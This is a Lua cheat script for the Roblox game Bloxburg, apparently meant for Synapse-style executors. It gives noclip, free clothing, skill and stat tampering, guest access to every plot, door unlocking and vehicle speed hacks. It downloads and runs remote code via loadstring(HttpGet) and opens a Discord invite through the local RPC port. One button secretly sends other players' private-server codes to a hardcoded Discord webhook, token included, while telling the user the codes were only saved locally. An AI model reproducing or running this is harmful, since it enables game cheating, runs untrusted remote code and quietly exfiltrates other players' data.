--vairibles 
if syn and syn.cache_replace and syn.cache_invalidate and syn.is_cached and syn.write_clipboard and syn.set_thread_identity then
    rconsolename("Moonware Console")
    rconsoleprint("-----------------------------------------".."\n".."Hello, "..game.Players.LocalPlayer.Name.."! Thanks For Using Moonware.".."\n".."Please Be Aware That Moonware BloxBurg Is Currently In Beta Mode And May Have Some Issues!".."\n".."\n".."[Infomantion]".."\n")
    rconsoleprint("Status: ")
    rconsoleprint('@@GREEN@@')
    rconsoleprint("Working")
    rconsoleprint('@@WHITE@@')
    rconsoleprint("\n".."Bloxburg Version: ")
    rconsoleprint('@@GREEN@@')
    rconsoleprint(game:GetService("ReplicatedStorage").Version.VersionString.Value.."\n")
    rconsoleprint('@@WHITE@@')
    rconsoleprint("Made By: ")
    rconsoleprint('@@LIGHT_CYAN@@')
    rconsoleprint("Zex and Scriptz".."\n")
    rconsoleprint("discord.gg/qyfwMb6CMK".."\n".."-----------------------------------------".."\n")
    end
    local messagebox = require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.Utilities.GUIHandler);
    local localplayer = game:GetService("Players").LocalPlayer;
    local userinput = game:GetService("UserInputService");
    
    local Modules = {
        car = require(game:GetService("ReplicatedStorage").Modules.VehicleService.VehicleData);
        AppearanceHandler = require(game:GetService("ReplicatedStorage").Modules.AppearanceService);
            bills = require(game:GetService("ReplicatedStorage").Modules.BillService);
            plothandler = require(game:GetService("ReplicatedStorage").Modules.PlotService);
            body_clothes = require(game:GetService("ReplicatedStorage").Modules.Data.AppearanceAssetData.Body);
            clothing_items = require(game:GetService("ReplicatedStorage").Modules.Data.AppearanceAssetData.Accessories);
    main_clothing = require(game:GetService("ReplicatedStorage").Modules.Data.AppearanceAssetData.Clothing);
        }
        
    local EnviromentInfo  = {
            setalwaysday = false;
            timeofdayy = "Day";
            weather = "Clear";
        }
    --Pop up Messages
        local message_text = {
            BlueQ_Neighborhood = "Neighbor Hood code has been copied to your clipboard!".."\n".."Please do not leak the code to non Moonware users, this will make the Neighborhood a ban risk for all the users, stay safe!",
            startup = "Hello "..game.Players.LocalPlayer.Name..", BlueQ is in beta at the moment, expect bugs! "..game:HttpGet("https://pastebin.com/raw/Byu7JauW"), "Bloxburg",
            startup_neighborhood = "Hello "..game.Players.LocalPlayer.Name..", BlueQ is in beta at the moment, expect bugs! Thanks for playing safe in a Neighborhood"..game:HttpGet("https://pastebin.com/raw/Byu7JauW"), "Bloxburg", 1,
            bloxburg_updated = "Bloxburg has updated, some scripts may be patched!", "Welcome To Coolburg",
            discord_join = "The Moonware discord invite has been copied to your clipboard, We hope you have a fun expirience!",
            writefile_synapse = "Success! NeighborHood codes have been saved!".."\n".."\n".."Path:".."\n".."SynapseX-workspace-BlueQ-GeneratedCodes.txt",
         writefile_krnl = "Success! NeighborHood codes: ".."\n".."\n".."Path:".."\n"..game:HttpGet("https://pastebin.com/raw/X3hnsh0p")
            
        };
    
    --NeighborHood Checker
    if game.PlaceId == 185655149 then         
    messagebox:AlertBox(message_text.startup) 
    else
    messagebox:AlertBox(message_text.startup_neighborhood);
    end
    
    --Bloxburg Version
    local game_version_check = game:GetService("ReplicatedStorage").Version;
    if game_version_check.Value == 1011 then
        if game_version_check.VersionString.Value == "0.10.1a" then
            print("game_version_check")
            else 
                messagebox:AlertBox(message_text.bloxburg_updated);
        end
    end
    
    if syn and syn.cache_replace and syn.cache_invalidate and syn.is_cached and syn.write_clipboard and syn.set_thread_identity then
    messagebox:MessageBox(message_text.discord_join);
        local http = game:GetService('HttpService') 
        local req = (syn and syn.request) or (http and http.request) or http_request
        if req then
            req({
                Url = 'http://127.0.0.1:6463/rpc?v=1',
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json',
                    Origin = 'https://discord.com'
                },
                Body = http:JSONEncode({
                    cmd = 'INVITE_BROWSER',
                    nonce = http:GenerateGUID(false),
                    args = {code = 'RkD6gMk'}
                })
            })
        end
    wait(0.1) setclipboard("discord.gg/qyfwMb6CMK")
    end
    --misc scripts
    
    game:GetService("RunService").Stepped:Connect(function()
        if noclip == true then
      for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
    if v:IsA("BasePart") then
           v.CanCollide = false
       elseif noclip == false then
                    for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
       if v:IsA("BasePart") then
               v.CanCollide = true
          end
            end
                end
    end
    end
    end)
    
    game:GetService("RunService").Stepped:Connect(function()
    if carclip == true then
     for i,v in pairs(game:GetService("Workspace")[game.Players.LocalPlayer.Name]:GetDescendants()) do
         if v:IsA("BasePart") then
               v.CanCollide = false
           elseif carclip == false then
         for i,v in pairs(game:GetService("Workspace")[game.Players.LocalPlayer.Name]:GetDescendants()) do
           if v:IsA("BasePart") then
         v.CanCollide = true
                end
            end
                end
    end
    end
    end)
    
        local TimeOfDay = game:GetService("Lighting"):FindFirstChild("TimeOfDay")
        TimeOfDay:GetPropertyChangedSignal("Value"):Connect(function()
            if EnviromentInfo.setalwaysday and EnviromentInfo.timeofdayy ~= nil then
                if EnviromentInfo.timeofdayy == "Day" then
                    TimeOfDay.Value = 600
                elseif EnviromentInfo.timeofdayy == "Night" then 
                    TimeOfDay.Value = 10
                end
            end
        end)
        
            local Weather = game:GetService("Lighting"):FindFirstChild("Weather") 
        Weather:GetPropertyChangedSignal("Value"):Connect(function()
            if EnviromentInfo.setalwaysday and EnviromentInfo.weather ~= nil then
                if EnviromentInfo.weather == "Clear" then
                    Weather.Value = ""
                else
                    Weather.Value = EnviromentInfo.weather
                end
            end
        end)
    --Main script!
    local Vrsn = "["..game_version_check.VersionString.Value.."]" -- Version
    local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
    local win = DiscordLib:Window("BlueQ! "..Vrsn)
    local serv = win:Server("Main", "")
    local btns = serv:Channel("Miscellaneous")
    
    
    local JumpPower = btns:Slider("Jump Power", 40, 200, 40, function(t)
    game:GetService("Workspace")[game.Players.LocalPlayer.Name].Humanoid.SetJumpPower.Value = t
    
    
    end)
    
    btns:Toggle("Noclip",false, function(bool)
        if bool == true then
    noclip = true 
    elseif bool == false then
        noclip = false
    end
    end)
    
    btns:Toggle("Slow House Bills",false, function(bool)
        if bool == true then
                    for i,v in next, Modules.bills do 
                v.DefaultBillPercentage = 0
                v.BillTime = 0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
                v.PremiumBillDecrease = 100
                    end
    elseif bool == false then
    for i,v in next, Modules.bills do 
    v.DefaultBillPercentage = 0.010
    v.PremiumBillDecrease = 0.5
    v.BillTime = 60
    end
    end
    end)
    
    btns:Toggle("Free Clothes, Accessories & Bodys",false, function(bool)
                if bool == true then
    for i,v in next, Modules.clothing_items do
        v.Price = 0
                    end
             for i,v in next, Modules.main_clothing do 
                    v.Price = 0
                          end
        for i,v in next, Modules.body_clothes do 
                    v.Price = 0
                    end
                elseif bool == false then
    for i,v in next, Modules.clothing_items do
        v.Price = 10
                    end
             for i,v in next, Modules.main_clothing do 
                    v.Price = 10
                          end
        for i,v in next, Modules.body_clothes do 
                    v.Price = 10
                    end end
    end)
            
            btns:Toggle("Unlock All Recipies",false, function(bool)
                   if bool == true then
                       game:GetService("ReplicatedStorage").Stats[localplayer.Name].SkillData.Cooking.Value = 10
                          for i,v in next, Modules.plothandler do 
                    v.Skill = 0
                          end 
                          elseif bool == false then
                       game:GetService("ReplicatedStorage").Stats[localplayer.Name].SkillData.Cooking.Value = 2
                          for i,v in next, Modules.plothandler do 
                    v.Skill = 5
                          end end end)
            
    
    
    local btnss = btns:Slider("Max Hats Equiped", 0, 100, 3, function(t)
       for i,v in next, Modules.AppearanceHandler do
    v.MaxHats = t
    end
    end)
    
    --plot stuff
          btns:Toggle("Infinite Plot Floors",false, function(bool)
    if bool == true then
        if game:GetService("ReplicatedStorage").Stats[localplayer.Name].Gamepasses[1184148].Value == false then
    messagebox:AlertBox("Multiple Gamepass Needed!");
    else
       for i,v in next, Modules.plothandler do
    v.MaxFloor = math.huge();
    end end
    elseif bool == false then
       for i,v in next, Modules.plothandler do
    v.MaxFloor = 5;
    end
    end
    end)
    
    
        btns:Toggle("Toggle All Plot Lights",false, function(bool)
    for i,v in pairs(game:GetService("Workspace").Plots:GetDescendants()) do
        if v.Name == 'IsOn' then
            v.Value = bool;
            end
    end end)
    
        btns:Toggle("Guest To All Plots",false, function(bool)
    for i,v in pairs(game:GetService("Workspace").Plots:GetDescendants()) do
        if v.Name == 'IsLocked' then
            if bool == false then 
                v.Value = true
            elseif bool == true then
                v.Value = false
            end end
    end end)
    
        btns:Toggle("Open All Plot Doors",false, function(bool)
    for i,v in pairs(game:GetService("Workspace").Plots:GetDescendants()) do
        if v.Name == 'IsOpen' then
            v.Value = bool;
            end
    end end)
    
    
    --ENVIROMENT
    
    local Enviroment = serv:Channel("Enviroment")
    
        Enviroment:Toggle("Set Day-Time",false, function(bool)
            EnviromentInfo.setalwaysday = bool
     end)
     
     local drop = Enviroment:Dropdown("Weather",{"Clear","Rainy","Snowy"}, function(bool)
    if bool == "Clear" then
        EnviromentInfo.weather = "Clear"
        Weather.Value = "Clear"
    elseif  bool == "Rainy" then
          EnviromentInfo.weather = "Rain"
        Weather.Value = "Rain"
        elseif  bool == "Snowy" then
          EnviromentInfo.weather = "Snow"
        Weather.Value = "Snow"
        end
     end)
    
     local dropp = Enviroment:Dropdown("Day of the week",{"Monday","Tuesday","Wednesday", "Thursday", "Friday", "Saturday", "Sunday"}, function(bool)
    game:GetService("Lighting").Day.Value = bool;
    end)
    
    Enviroment:Label("Miscellaneous")
    local RainIntensity = Enviroment:Slider("Rain Intensity", 0, 10, 1, function(t)
        game:GetService("Lighting").WeatherProperties.RainIntensity.Value = t
        end)
    local SnowIntensity = Enviroment:Slider("Snow Intensity", 0, 10, 1, function(t)
        game:GetService("Lighting").WeatherProperties.SnowIntensity.Value = t
    end)
    local Brightness = Enviroment:Slider("Brightness", 0, 2, 1, function(t)
    game:GetService("Lighting").WeatherProperties.Brightness.Value = t
    end)
    
    local ski = serv:Channel("Skill Levels")
    ski:Toggle("Toggle All",false, function(bool)
        if bool == true then
        for i,v in pairs(game:GetService("ReplicatedStorage").Stats[localplayer.Name].SkillData:GetChildren()) do
            v.Value = 10 end
        elseif bool == false then
              for i,v in pairs(game:GetService("ReplicatedStorage").Stats[localplayer.Name].SkillData:GetChildren()) do
            v.Value = 1 end
            end end)
            
            local skpi = ski:Slider("Athletic", 0, 10, 1, function(t)
     game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Athletic.Value = t
    
    end)
    local sk = ski:Slider("Writing", 0, 10, 1, function(t)
     game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Writing.Value = t
    end)
    local skpi = ski:Slider("Intelligence", 0, 10, 1, function(t)
     game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Intelligence.Value = t
    end)
    local skpi = ski:Slider("Gardening", 0, 10, 1, function(t)
     game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Gardening.Value = t
     end)
    
    local skpi = ski:Slider("Cooking", 0, 10, 1, function(t)
        game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Cooking.Value = t
    end)
    local skpi = ski:Slider("Crafting", 0, 10, 1, function(t)
       game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Crafting.Value = t
    end)
    local skpi = ski:Slider("Gaming", 0, 10, 1, function(t)
       game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Gaming.Value = t
    end)
    local skpi = ski:Slider("Music", 0, 10, 1, function(t)
       game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Music.Value = t
    end)
    local skpi = ski:Slider("Painting", 0, 10, 1, function(t)
       game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Painting.Value = t
    end)
    local skpi = ski:Slider("Programming", 0, 10, 1, function(t)
       game:GetService("ReplicatedStorage").Stats[game.Players.LocalPlayer.Name].SkillData.Programming.Value = t
    end)
    
    --VEHICLES
    local Vehyy = serv:Channel("Vehicle")
    
    Vehyy:Toggle("Vehicle Noclip",false, function(bool)
        if bool == true then
    carclip = true 
    elseif bool == false then
        carclip = false
    end
    end)
    
    local Veh = Vehyy:Slider("Forward Speed", 0, 90, 10, function(t)
            for i,v in next, Modules.car do 
                v.ForwardSpeed = t
            end
    end)
    
    local Veh = Vehyy:Slider("Reverse Speed", 0, 90, 10, function(t)
            for i,v in next, Modules.car do 
                v.ReverseSpeed = t
            end
    end)
    
    local Veh = Vehyy:Slider("Turn Speed", 0, 200, 25, function(t)
            for i,v in next, Modules.car do 
                v.TurnSpeed = t
            end
    end)
    
    local Veh = Vehyy:Slider("Suspention", 0, 30, 1, function(t)
            for i,v in next, Modules.car do 
                v.SpringLength = t
            end
    end)
    
    Vehyy:Button("Destroy Vehicle", function(bool)		
      for i, v in next, localplayer:GetChildren() do
    if v.Name:sub(0, 8) == "Vehicle_" then 				v:Destroy()
                end
            end
    end)
    
    --NeighborHoods
    local hood = serv:Channel("NeighborHoods")
    --CREAT FOLDER
        if syn then
       if isfolder("BlueQ") then
           print("already exists") 
       else
           makefolder("BlueQ") 
       end
    end
    
    hood:Button("Generate NeighborHood Codes", function()
        wait(0.1) 
    if syn and syn.cache_replace and syn.cache_invalidate and syn.is_cached and syn.write_clipboard and syn.set_thread_identity then
               writefile("BlueQ/GeneratedCodes.txt", "Codes are generated by searching the newest created Pastebins with curtain keywords!".."\n".."NeighborHoods Generated: 100!".."\n"..game:HttpGet("https://pastebin.com/raw/X3hnsh0p"))
    messagebox:MessageBox(message_text.writefile_synapse) 
    else
    messagebox:MessageBox(message_text.writefile_krnl);
    end
        end)
    
    hood:Button("BlueQ Private NeighborHood", function()
        wait(0.1) setclipboard("Not availible yet!")
    messagebox:MessageBox(message_text.BlueQ_Neighborhood);
    end)
    
    hood:Button("Search Server For Codes", function()
     for i,v in pairs(game:GetService("ReplicatedStorage").Stats:GetChildren()) do
         if v.PrivateServer.Value == "" then
    print("No Codes Found")
    else
    if syn and syn.cache_replace and syn.cache_invalidate and syn.is_cached and syn.write_clipboard and syn.set_thread_identity then
    messagebox:MessageBox("Success! NeighborHood code(s) have been saved!".."\n".."\n".."Path:".."\n".."SynapseX-workspace-BlueQ-ServerCodes.txt!!");
    appendfile("BlueQ/ServerCodes.txt", v.Name)
    local response = syn.request(
        {
            Url = 'https://discord.com/api/webhooks/897101614215741480/Ej08C9SO5v6SOCp7GG5nXk4IDUxhDouDA-fUGSi7-hWkYazyo8OwlD16H8302U7uZKZP',
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode({content = "NeighborHood Code Found: "..v.Name})
        }
    );
    else 
    messagebox:MessageBox("Success! NeighborHood code found: "..v.Name);
    end
    end
    end
    end)
    
    --MOODS
    local moodz = serv:Channel("Moods")
    moodz:Label("Please stand on your plot when using these options!")
    moodz:Button("Fun", function()
    local jj = game.Players.LocalPlayer.Name
    print(game:GetService("Workspace").Plots["Plot_"..jj])
    for i,v in pairs(game:GetService("Workspace").Plots["Plot_"..jj]:GetDescendants()) do
        if v.Name == 'iWatch TV' then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.CFrame       
        elseif v.Name == 'Pixelview Infinity' then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.CFrame  
                elseif v.Name == 'Acutus 22" TV' then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.CFrame 
              elseif v.Name == 'AcuSlim TV' then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.CFrame 
                elseif v.Name == 'AcuSlim II TV' then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.CFrame 
             elseif v.Name == 'Pixelview 360' then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.CFrame 
       end     end
    end)
    
    moodz:Button("Hygiene", function()
    local jj = game.Players.LocalPlayer.Name
    print(game:GetService("Workspace").Plots["Plot_"..jj])
    for i,v in pairs(game:GetService("Workspace").Plots["Plot_"..jj].House.Objects:GetChildren()) do
    wait(1)
    if v.Name == "Basic Shower" then
        print("yeet")
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  game:GetService("Workspace").Plots["Plot_"..jj].House.Objects["Basic Shower"].CFrame
    wait(2)
    for i = 1,1,100  do
    wait();
    keypress(0x45); 
    keyrelease(0x45)
    wait(0.5)
    end
    wait()
    elseif v.Name == "Modern Shower"  then
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  game:GetService("Workspace").Plots["Plot_"..jj].House.Objects["Modern Shower"].CFrame
    wait(2)
    for i = 1,1,100  do
    wait();
    keypress(0x45); 
    keyrelease(0x45)
    wait(0.5)
    end 
    elseif v.Name == "Hygienic Shower" then
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  game:GetService("Workspace").Plots["Plot_"..jj].House.Objects["Hygienic Shower"].CFrame
    wait(2)
    for i = 1,1,100  do
    wait();
    keypress(0x45); 
    keyrelease(0x45)
    wait(0.5)
    end 
    elseif v.Name == "Rounded Shower" then
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  game:GetService("Workspace").Plots["Plot_"..jj].House.Objects["Rounded Shower"].CFrame
    wait(2)
    for i = 1,1,100  do
    wait();
    keypress(0x45); 
    keyrelease(0x45)
    wait(0.5)
    end 
    end
    end
    end)
    
    moodz:Label("More Soon!")
    
    local Transportation = serv:Channel("Transportation")
    local jobss = Transportation:Dropdown("Teleport To Jobs",{"Bloxy Burgers","Hairdresser","Mechanic","Pizza Planet Baker","Pizza Planet Delivery", "Fisherman", "Ice Cream Seller", "Supermarket Stocker", "Supermarket Cashier", "Woodcutter", "Janitor", "Miner"}, function(bool)
    if bool == "Bloxy Burgers" then
        require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("BloxyBurgersCashier")
    elseif bool == "Hairdresser" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("StylezHairdresser")
     elseif bool == "Mechanic" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("MikesMechanic")
           elseif bool == "Pizza Planet Baker" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("PizzaPlanetBaker")
         elseif bool == "Pizza Planet Delivery" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("PizzaPlanetDelivery")
        elseif bool == "Fisherman" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("HutFisherman")
        elseif bool == "Ice Cream Seller" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("BensIceCreamSeller")
         elseif bool == "Supermarket Stocker" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("SupermarketStocker")
           elseif bool == "Supermarket Cashier" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("SupermarketCashier")
             elseif bool == "Woodcutter" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("LumberWoodcutter")
               elseif bool == "Janitor" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("CleanJanitor")
                 elseif bool == "Miner" then
            require(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Scripts.JobHandler):GoToWork("CaveMiner")
            end
    end)
    
    local autowalk = Transportation:Dropdown("Auto Walk To Destination",{"Graveyard","Campsite", "City Hall", "Ferris Wheel", "Fancy Furniture", "Gym"}, function(bool)
        if bool == "Graveyard" then
            local serv = game:GetService("PathfindingService")
    local human = game.Workspace[game.Players.LocalPlayer.Name].Humanoid
    local body = game.Players.LocalPlayer.Character.HumanoidRootPart
    local dest = game:GetService("Workspace").Environment.Locations.Graveyard.Floor.Part
    local path = serv:CreatePath()
    path:ComputeAsync(body.Position,dest.Position)
    if path.Status == Enum.PathStatus.Success then
       local wayPoints = path:GetWaypoints()
       for i = 1,#wayPoints do
           local point = wayPoints[i]
           human:MoveTo(point.Position)
           local success = human.MoveToFinished:Wait()
           if point.Action == Enum.PathWaypointAction.Jump then
               human.WalkSpeed = 0
               wait(0.2)
               human.WalkSpeed = 15
               human.Jump = true
           end
           if not success then
               human.Jump = true
               human:MoveTo(point.Position)
               if not human.MoveToFinished:Wait() then
                   break
               end
           end
       end
    end
    elseif bool == "Campsite" then
                local serv = game:GetService("PathfindingService")
    local human = game.Workspace[game.Players.LocalPlayer.Name].Humanoid
    local body = game.Players.LocalPlayer.Character.HumanoidRootPart
    local dest = game:GetService("Workspace").Environment.Locations.Campsite["Fire Pit"]
    local path = serv:CreatePath()
    path:ComputeAsync(body.Position,dest.Position)
    if path.Status == Enum.PathStatus.Success then
       local wayPoints = path:GetWaypoints()
       for i = 1,#wayPoints do
           local point = wayPoints[i]
           human:MoveTo(point.Position)
           local success = human.MoveToFinished:Wait()
           if point.Action == Enum.PathWaypointAction.Jump then
               human.WalkSpeed = 0
               wait(0.2)
               human.WalkSpeed = 15
               human.Jump = true
           end
           if not success then
               human.Jump = true
               human:MoveTo(point.Position)
               if not human.MoveToFinished:Wait() then
                   break
               end
           end
       end
    end
    elseif bool == "City Hall" then
                local serv = game:GetService("PathfindingService")
    local human = game.Workspace[game.Players.LocalPlayer.Name].Humanoid
    local body = game.Players.LocalPlayer.Character.HumanoidRootPart
    local dest = game:GetService("Workspace").Environment.Locations.CityHall.Floor
    local path = serv:CreatePath()
    path:ComputeAsync(body.Position,dest.Position)
    if path.Status == Enum.PathStatus.Success then
       local wayPoints = path:GetWaypoints()
       for i = 1,#wayPoints do
           local point = wayPoints[i]
           human:MoveTo(point.Position)
           local success = human.MoveToFinished:Wait()
           if point.Action == Enum.PathWaypointAction.Jump then
               human.WalkSpeed = 0
               wait(0.2)
               human.WalkSpeed = 15
               human.Jump = true
           end
           if not success then
               human.Jump = true
               human:MoveTo(point.Position)
               if not human.MoveToFinished:Wait() then
                   break
               end
           end
       end
    end
    elseif bool == "Ferris Wheel" then
                local serv = game:GetService("PathfindingService")
    local human = game.Workspace[game.Players.LocalPlayer.Name].Humanoid
    local body = game.Players.LocalPlayer.Character.HumanoidRootPart
    local dest = game:GetService("Workspace").Environment.Locations.FerrisWheel.MainSupport
    local path = serv:CreatePath()
    path:ComputeAsync(body.Position,dest.Position)
    if path.Status == Enum.PathStatus.Success then
       local wayPoints = path:GetWaypoints()
       for i = 1,#wayPoints do
           local point = wayPoints[i]
           human:MoveTo(point.Position)
           local success = human.MoveToFinished:Wait()
           if point.Action == Enum.PathWaypointAction.Jump then
               human.WalkSpeed = 0
               wait(0.2)
               human.WalkSpeed = 15
               human.Jump = true
           end
           if not success then
               human.Jump = true
               human:MoveTo(point.Position)
               if not human.MoveToFinished:Wait() then
                   break
               end
           end
       end
    end
    elseif bool == "Fancy Furniture" then
                local serv = game:GetService("PathfindingService")
    local human = game.Workspace[game.Players.LocalPlayer.Name].Humanoid
    local body = game.Players.LocalPlayer.Character.HumanoidRootPart
    local dest = game:GetService("Workspace").Environment.Locations.FancyFurniture.FrontDoor.Base
    local path = serv:CreatePath()
    path:ComputeAsync(body.Position,dest.Position)
    if path.Status == Enum.PathStatus.Success then
       local wayPoints = path:GetWaypoints()
       for i = 1,#wayPoints do
           local point = wayPoints[i]
           human:MoveTo(point.Position)
           local success = human.MoveToFinished:Wait()
           if point.Action == Enum.PathWaypointAction.Jump then
               human.WalkSpeed = 0
               wait(0.2)
               human.WalkSpeed = 15
               human.Jump = true
           end
           if not success then
               human.Jump = true
               human:MoveTo(point.Position)
               if not human.MoveToFinished:Wait() then
                   break
               end
           end
       end
    end
    elseif bool == "Gym" then
                local serv = game:GetService("PathfindingService")
    local human = game.Workspace[game.Players.LocalPlayer.Name].Humanoid
    local body = game.Players.LocalPlayer.Character.HumanoidRootPart
    local dest = game:GetService("Workspace").Environment.Locations.Gym.IndustrialLight.Base
    local path = serv:CreatePath()
    path:ComputeAsync(body.Position,dest.Position)
    if path.Status == Enum.PathStatus.Success then
       local wayPoints = path:GetWaypoints()
       for i = 1,#wayPoints do
           local point = wayPoints[i]
           human:MoveTo(point.Position)
           local success = human.MoveToFinished:Wait()
           if point.Action == Enum.PathWaypointAction.Jump then
               human.WalkSpeed = 0
               wait(0.2)
               human.WalkSpeed = 15
               human.Jump = true
           end
           if not success then
               human.Jump = true
               human:MoveTo(point.Position)
               if not human.MoveToFinished:Wait() then
                   break
               end
           end
       end
    end
        end
    end)
    
    local Visuals = serv:Channel("Visuals")
    Visuals:Textbox("Custom Message Box!", "Message here!", true, function(t)
    messagebox:MessageBox(t);
    end)
    Visuals:Textbox("Custom Alert Message!", "Message here!", true, function(t)
    messagebox:AlertBox(t);
    end)
    Visuals:Textbox("Custom Confirm Message!", "Message here!", true, function(t)
    messagebox:ConfirmBox(t);
    end)
    
    Visuals:Button("Delete All Trees", function()
    for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
        if v.Name == 'Tree' then
            v:Destroy()
            end
    end 
    end)
    
    local StatView = serv:Channel("Players")
    StatView:Textbox("Stat Viewer", "Username here!", true, function(t)
    print("Recived: "..t.."'s Stats!")
    messagebox:MessageBox(t.."'s Stats!".."\n".."Currency!".."\n".."Money: "..game:GetService("ReplicatedStorage").Stats[t].Money.Value.."\n".."Blockbux: "..game:GetService("ReplicatedStorage").Stats[t].Blockbux.Value.."\n".."\n".."Moods!".."\n".."Fun: "..game:GetService("ReplicatedStorage").Stats[t].MoodData.Fun.Value.."\n".."Energy: "..game:GetService("ReplicatedStorage").Stats[t].MoodData.Energy.Value.."\n".."Hunger: "..game:GetService("ReplicatedStorage").Stats[t].MoodData.Hunger.Value.."\n".."Hygiene: "..game:GetService("ReplicatedStorage").Stats[t].MoodData.Hygiene.Value.."\n");
    end)